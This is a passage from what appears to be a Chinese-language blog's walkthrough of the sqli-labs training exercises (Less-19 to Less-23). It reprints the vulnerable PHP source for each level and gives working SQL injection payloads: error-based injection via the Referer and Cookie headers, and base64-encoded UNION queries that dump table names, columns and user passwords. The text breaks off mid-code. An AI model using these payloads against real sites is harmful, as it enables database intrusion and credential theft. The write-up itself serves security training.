POST报错注入<br>同上只是构造的请求头不一样<br>通过构造Referer<br><code>Referer: http://localhost/sqli-labs/Less-19/ ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">无cookie时 登录部分</span><br><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]); </span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]); </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"> <span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"> <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"> <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>); <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">有cookie时 登录部分 </span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]; </span><br><span class="line"><span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line"> <span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="variable">$format</span>, <span class="variable">$timestamp</span>); <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>; <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>错误的cookie头部POST注入<br>这里因为不是Inser语句 ， 所以在补全SQL语句的时候不需要加,”,”)<br>通过构造cookie<br><code>payload-header:Cookie: uname=admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(21-40)</title>
      <link href="/2019/01/20/sql-lab(21-40)/"/>
      <url>/2019/01/20/sql-lab(21-40)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))    <span class="comment">// Quote if not a number</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  <span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">  <span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;   </span><br><span class="line">    <span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">   <span class="variable">$format</span> = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">   <span class="variable">$timestamp</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;   </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="variable">$format</span>, <span class="variable">$timestamp</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">   <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">   <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>; </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  &#125;  </span><br></pre></td></tr></table></figure><p>通过查看源码，我们发现这道题不仅加了过滤（check_input），而且需要对cookie:uname进行base 64编码，这样才能匹配<br>测试：<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-14c2900ff6ef6851.png" alt="image.png"><br><code>&#39; union select 1,1,database() #</code><br><code>JyB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgIw==</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-f30017cc287ef063.png" alt="image.png"><br>根据报错，源码中是括号中的单引号，故语句应改为<br>爆库<br><code>&#39;) union select 1,1,database() #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxkYXRhYmFzZSgpICM=</code><br>放入burp中，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-eb3f09f9c7451d95.png" alt="image.png"><br>爆表<br><code>&#39;) union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-84cbd8ab8f3bba2c.png" alt="image.png"><br>爆列<br><code>&#39;) union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a1dc636dbfc7e661.png" alt="image.png"><br>爆值<br><code>&#39;) union select 1,1,group_concat(username,password) from users#</code><br><code>JykgdW5pb24gc2VsZWN0IDEsMSxncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMj</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-079dfda1292af05d.png" alt="image.png"></p><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>看了源码发现和less-21差不多，所以这里只需要根据报错提示修改注入语句即可<br>测试<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-105dc6974d0380f7.png" alt="image.png"><br>在burp中输入以上发现报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5b7cf7c5f5870db4.png" alt="image.png"><br>故只需将【”)】改为【”】即可，重复less21的步骤。</p><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span 